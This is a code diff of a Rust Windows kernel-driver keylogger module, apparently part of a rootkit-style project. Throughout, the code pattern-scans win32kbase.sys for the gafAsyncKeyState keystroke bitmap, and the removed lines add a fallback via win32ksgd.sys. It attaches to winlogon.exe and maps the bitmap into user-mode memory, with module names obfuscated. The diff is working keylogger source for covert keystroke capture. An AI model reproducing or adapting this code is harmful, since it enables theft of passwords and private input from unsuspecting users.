@@ -102,100 +102,52 @@ impl Keylogger {
     ///
     /// * `Ok(*mut c_void)` - If successful, returns a pointer to the mapped user-mode address of `gafAsyncKeyState`.
     /// * `Err(ShadowError)` - If any error occurs while finding the address or mapping memory.
-   unsafe fn get_gafasynckeystate_address() -> Result<*mut u8> {
-    // Attempt primary logic: Using pattern scan on win32kbase.sys
-    let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
-    let function_address = get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
-    let pattern = [0x48, 0x8B, 0x05];
-
-    match scan_for_pattern(function_address, &pattern, 3, 7, 0x200) {
-        Ok(address) => {
-            // Successfully found the pattern.
-            Ok(address)
-        }
-        Err(e) => {
-            // Log the error and fall back to alternative logic.
-            log::warn!(
-                "Pattern scan failed with error: {:?}. Falling back to alternative logic.",
-                e
-            );
-
-            // Fallback logic: use the new driver win32ksgd.sys.
-            let fallback_module_address = get_module_base_address(obfstr!("win32ksgd.sys"))?;
-            log::info!("win32ksgd.sys base address: {:p}", fallback_module_address);
-
-            // Get the address of SGDGetUserSessionState.
-            let fallback_function_address =
-                get_function_address(obfstr!("SGDGetUserSessionState"), fallback_module_address)?;
-            log::info!("SGDGetUserSessionState address: {:p}", fallback_function_address);
-
-            // Calculate the key state address by adding the offset.
-            let key_state_address = fallback_function_address.add(0x3708);
-            log::info!(
-                "Key state address (SGDGetUserSessionState + 0x3708): {:p}",
-                key_state_address
-            );
-
-            Ok(key_state_address as *mut u8)
-        }
-    }
-}
-
-
-    /// Retrieves the user-mode mapped address for the key state bitmap.
     pub unsafe fn get_user_address_keylogger() -> Result<*mut c_void> {
-        // Get the PID of winlogon.exe.
-        log::info!("Retrieving PID for winlogon.exe");
+        // Get the PID of winlogon.exe
         let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
-        log::info!("winlogon.exe PID: {}", pid);
 
-        // Attach to winlogon.exe process.
-        log::info!("Attaching to winlogon.exe process (PID: {})", pid);
+        // Attach to the winlogon.exe process
         let winlogon_process = Process::new(pid)?;
-        let _attach_process = ProcessAttach::new(winlogon_process.e_process);
-        log::info!("Attached to winlogon.exe at EPROCESS: {:p}", winlogon_process.e_process);
+        let attach_process = ProcessAttach::new(winlogon_process.e_process);
 
-        // Retrieve the new key state address.
-        log::info!("Resolving key state address via SGDGetUserSessionState");
-        let key_state_address = Self::get_gafasynckeystate_address()?;
-        log::info!("Key state address: {:p}", key_state_address);
+        // Retrieve the address of gafAsyncKeyState
+        let gaf_async_key_state_address = Self::get_gafasynckeystate_address()?;
 
-        // Allocate an MDL for the key state bitmap.
-        log::info!("Allocating MDL for 64 bytes at key state address");
-        let mdl = IoAllocateMdl(
-            key_state_address.cast(),
-            core::mem::size_of::<[u8; 64]>() as u32,
-            0,
-            0,
-            core::ptr::null_mut(),
-        );
+        // Allocate an MDL (Memory Descriptor List) to manage the memory
+        let mdl = IoAllocateMdl(gaf_async_key_state_address.cast(), size_of::<[u8; 64]>() as u32, 0, 0, null_mut());
         if mdl.is_null() {
-            log::error!("IoAllocateMdl failed for address: {:p}", key_state_address);
             return Err(ShadowError::FunctionExecutionFailed("IoAllocateMdl", line!()));
         }
-        log::info!("MDL allocated at address: {:p}", mdl);
 
-        // Build the MDL for the non-paged pool.
-        log::info!("Building MDL for non-paged pool");
+        // Build the MDL for the non-paged pool
         MmBuildMdlForNonPagedPool(mdl);
 
-        // Map the locked pages into user-mode address space.
-        log::info!("Mapping locked pages into user-mode address space");
-        let address = MmMapLockedPagesSpecifyCache(
-            mdl,
-            UserMode as i8,
-            MmCached,
-            core::ptr::null_mut(),
-            0,
-            NormalPagePriority as u32,
-        );
+        // Map the locked pages into user-mode address space
+        let address = MmMapLockedPagesSpecifyCache(mdl, UserMode as i8, MmCached, null_mut(), 0, NormalPagePriority as u32);
         if address.is_null() {
-            log::error!("MmMapLockedPagesSpecifyCache failed for MDL: {:p}", mdl);
             IoFreeMdl(mdl);
             return Err(ShadowError::FunctionExecutionFailed("MmMapLockedPagesSpecifyCache", line!()));
         }
-        log::info!("Mapped user-mode address: {:p}", address);
 
         Ok(address)
+    }
+
+    /// Retrieves the address of the `gafAsyncKeyState` array.
+    ///
+    /// # Returns
+    ///
+    /// * `Ok(*mut u8)` - Returns a pointer to the `gafAsyncKeyState` array if found.
+    /// * `Err(ShadowError)` - If the array is not found or an error occurs during the search.
+    unsafe fn get_gafasynckeystate_address() -> Result<*mut u8> {
+        // Get the base address of win32kbase.sys
+        let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
+
+        // Get the address of the NtUserGetAsyncKeyState function
+        let function_address = get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
+
+        // Search for the pattern that identifies the gafAsyncKeyState array
+        // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
+        let pattern = [0x48, 0x8B, 0x05];
+        scan_for_pattern(function_address, &pattern, 3, 7, 0x200)
     }
 }
